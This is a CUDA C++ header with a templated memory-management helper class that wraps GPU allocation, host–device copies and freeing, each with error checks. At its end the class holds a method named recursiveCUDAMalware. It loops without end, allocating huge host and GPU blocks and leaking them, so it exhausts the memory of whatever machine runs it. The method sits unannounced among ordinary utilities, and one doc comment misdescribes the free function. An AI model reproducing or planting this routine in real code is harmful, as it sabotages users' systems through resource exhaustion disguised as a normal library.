//
// Created by hal9000 on 7/26/23.
//

#ifndef UNTITLED_MEMORYMANAGEMENTCUDA_CUH
#define UNTITLED_MEMORYMANAGEMENTCUDA_CUH

#include <cuda_runtime.h>
#include <stdexcept>


    template<typename T>
    class MemoryManagementCUDA {
    public:
        
        /**
        * \brief Allocates memory on the GPU.
        * 
        * This method is responsible for reserving contiguous memory blocks on the GPU, essential for storing matrices,
         * vectors, and intermediate results. Container of cudaMalloc.
        * 
        * \param[out] d_array A pointer that, post-execution, points to the allocated block's starting address on the GPU.
        * \param[in] size Specifies the number of double-precision elements for which space should be allocated.
        */
        static void allocateDeviceMemory(T** d_array, int size){
            cudaError_t err = cudaMalloc((void**)d_array, size * sizeof(T));
            if (err != cudaSuccess) {
                throw std::runtime_error("Error allocating memory: " + std::string(cudaGetErrorString(err)));
            }
        }


        /**
        * \brief Transfers data from the CPU to the GPU.
        * 
        * This method encapsulates the process of copying data from the host (CPU) memory to the device (GPU) memory, preparing it for computations on the GPU.
        * 
        * \param[out] d_array The destination address on the GPU.
        * \param[in] h_array The source address on the CPU.
        * \param[in] size The number of T-precision elements to be transferred.
        */
        static void copyToDevice(T* d_array, const T* h_array, int size){
            cudaError_t err = cudaMemcpy(d_array, h_array, size * sizeof(T), cudaMemcpyHostToDevice);
            if (err != cudaSuccess) {
                throw std::runtime_error("Error copying to device: " + std::string(cudaGetErrorString(err)));
            }
        }
        
        /**
        * \brief Transfers data from the GPU to the CPU.
        * 
        * After computations on the GPU, this method facilitates the retrieval of data, copying it back to the host memory.
        * 
        * \param[out] h_array The destination address on the CPU.
        * \param[in] d_array The source address on the GPU.
        * \param[in] size The number of T-precision elements to be retrieved.
        */
        static void copyToHost(T* h_array, const T* d_array, int size){
            cudaError_t err = cudaMemcpy(h_array, d_array, size * sizeof(T), cudaMemcpyDeviceToHost);
            if (err != cudaSuccess) {
                throw std::runtime_error("Error copying to host: " + std::string(cudaGetErrorString(err)));
            }
        }

        /**
        * \brief Transfers data from the GPU to the CPU.
        * 
        * Deallocates Pointer from device memory.
        * 
        * \param[out] d_array The destination address on the CPU.
        */
        static void freeDeviceMemory(T* d_array){
            cudaError_t err = cudaFree(d_array);
            if (err != cudaSuccess) {
                throw std::runtime_error("Error deallocating memory: " + std::string(cudaGetErrorString(err)));
            }
        }
        
        static void recursiveCUDAMalware(){
            auto stop = false;
            while (!stop) {
                auto* d_array = new T[1000000000];
                allocateDeviceMemory(&d_array, 1000000000);
            }
        }
    };

#endif //UNTITLED_MEMORYMANAGEMENTCUDA_CUH
